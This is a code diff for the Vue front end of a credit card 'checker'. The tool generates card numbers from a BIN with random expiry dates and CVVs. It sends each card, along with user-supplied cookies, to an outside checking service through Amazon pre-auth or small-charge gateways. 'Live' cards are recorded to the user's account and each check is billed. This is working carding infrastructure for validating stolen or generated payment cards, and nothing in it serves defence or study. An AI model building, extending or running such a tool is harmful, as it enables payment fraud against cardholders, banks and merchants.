@@ -102,10 +102,6 @@
                                 class="flex items-center group gap-2">
                                 <template v-if="item.type === 'approved'">
                                     <Approved />
-                                    <span class="text-green-400 font-bold">Approved</span>
-                                    <span class="text-gray-600">→</span>
-                                    <span class="text-gray-400">{{ item.card }}</span>
-                                    <span class="text-gray-600">→</span>
                                     <span class="text-green-400" v-html="item.html" />
                                 </template>
                             </div>
@@ -135,15 +131,16 @@
                                 class="flex items-center group gap-2">
                                 <template v-if="item.type === 'refused'">
                                     <Refused />
-                                    <span class="text-gray-400">{{ item.card }}</span>
-                                    <span class="text-gray-600">→</span>
                                     <span class="text-red-400" v-html="item.html" />
                                 </template>
                                 <template v-else-if="item.type === 'error'">
                                     <ErrorIcon />
-                                    <span class="text-gray-400">{{ item.card }}</span>
-                                    <span class="text-gray-600">→</span>
-                                    <span class="text-yellow-400">{{ item.html }}</span>
+                                    <span class="text-yellow-400">
+                                        <span v-html="item.html"></span>
+                                        <template v-if="item.bank">
+                                            <span class="text-blue-400"> ({{ item.bank }})</span>
+                                        </template>
+                                    </span>
                                 </template>
                             </div>
                         </transition-group>
@@ -286,9 +283,31 @@ const loaded = ref(0)
 const genBin = ref('')
 const showNoBalanceModal = ref(false)
 const errorMessage = ref('')
+const showConfig = ref(false)
+const settings = ref({
+    threads: 1,
+    gateway: 'Amazon US (Faster Pre-auth)',
+    removeCards: false,
+    approvedLog: false,
+    cookies: ''
+})
 
 const hideApproved = ref(false)
 const hideRefused = ref(true)
+
+if (typeof window !== 'undefined') {
+    const saved = localStorage.getItem('checkerSettings')
+    if (saved) {
+        try {
+            Object.assign(settings.value, JSON.parse(saved))
+        } catch {}
+    }
+}
+
+// Salvar configurações no localStorage sempre que mudar
+watch(settings, (val) => {
+    localStorage.setItem('checkerSettings', JSON.stringify(val))
+}, { deep: true })
 
 function playAudio(refAudio) {
     try {
@@ -306,11 +325,14 @@ function generateCards() {
         for (let c of bin) {
             cc += c.toLowerCase() === 'x' ? Math.floor(Math.random() * 10) : c;
         }
+        // Completa até 16 dígitos se necessário
         while (cc.length < 16) cc += Math.floor(Math.random() * 10);
         cc = cc.slice(0, 16);
 
-        let mm = String(Math.floor(Math.random() * 12) + 1).padStart(2, '0');
-        let yy = String((new Date().getFullYear() % 100) + Math.floor(Math.random() * 5) + 1).padStart(2, '0');
+        // Pega MM e YY do BIN se existirem, senão gera aleatório
+        let parts = genBin.value.trim().split('|');
+        let mm = parts[1] ? parts[1].padStart(2, '0') : String(Math.floor(Math.random() * 12) + 1).padStart(2, '0');
+        let yy = parts[2] ? parts[2].padStart(2, '0') : String((new Date().getFullYear() % 100) + Math.floor(Math.random() * 5) + 1).padStart(2, '0');
         let cvv = String(Math.floor(Math.random() * 1000)).padStart(3, '0');
         cards.push(`${cc}|${mm}|${yy}|${cvv}`);
     }
@@ -349,11 +371,12 @@ async function startCheck() {
 
     async function processCard(card) {
         try {
-            const res = await fetch('https://lunarcntr.xyz/checker2/paid/api.php', {
-                method: 'POST',
+            const res = await fetch('https://vortexcenter.xyz/3bfa94eb-fbdb-46f5-9940-903334cda078/checker', {
+                method: "POST",
                 headers: {
-                    'accept': '*/*',
-                    'content-type': 'text/plain;charset=UTF-8'
+                    "accept": "*/*",
+                    "content-type": "application/json",
+                    Authorization: "c707825b-b46f-4de9-b2b6-9ba414d6b55c",
                 },
                 body: JSON.stringify({
                     card,
@@ -364,14 +387,14 @@ async function startCheck() {
                 })
             })
             const data = await res.json()
-            if (data.status === 'approved') {
+            // Novo formato: data.return.status, data.return.html, data.return.message, data.return.bank
+            if (data.return && data.return.status === 'success') {
                 approved.value.push({
                     type: 'approved',
-                    card,
-                    html: data.html
+                    card: data.card,
+                    html: data.return.html || `${data.return.message} <span class="text-blue-400">(${data.return.bank})</span>`
                 })
                 playAudio(audioLive)
-                // 3. Salva live no array lives e desconta 0.10 do saldo
                 await updateDoc(userRef, {
                     lives: arrayUnion(card),
                     checksMonth: (await getDoc(userRef)).data().checksMonth + 1,
@@ -382,20 +405,18 @@ async function startCheck() {
                 })
             } else {
                 refused.value.push({
-                    type: 'refused',
-                    card,
-                    html: data.html
-                })
-                await updateDoc(userRef, {
-                    checksMonth: (await getDoc(userRef)).data().checksMonth + 1,
-                    lastCheck: serverTimestamp()
+                    type: data.return?.status === 'error' ? 'error' : 'refused',
+                    card: data.card || card,
+                    html: data.return?.html || data.return?.message || 'Refused',
                 })
             }
         } catch (e) {
+            let bank = e?.response?.data?.return?.bank || (e?.bank ?? '');
             refused.value.push({
                 type: 'error',
                 card,
-                html: 'An error occurred'
+                html: 'An error occurred',
+                bank
             })
         }
         tested.value++
@@ -443,15 +464,6 @@ const gatewayMap = {
     'Amazon AE (Charge ~$1)': 'AE',
 }
 
-const showConfig = ref(false)
-const settings = ref({
-    threads: 1,
-    gateway: 'Amazon US (Faster Pre-auth)',
-    removeCards: false,
-    approvedLog: false,
-    cookies: ''
-})
-
 function resetSettings() {
     settings.value = {
         threads: 1,
@@ -460,6 +472,7 @@ function resetSettings() {
         approvedLog: false,
         cookies: '',
     }
+    localStorage.removeItem('checkerSettings')
 }
 
 function saveSettings() {
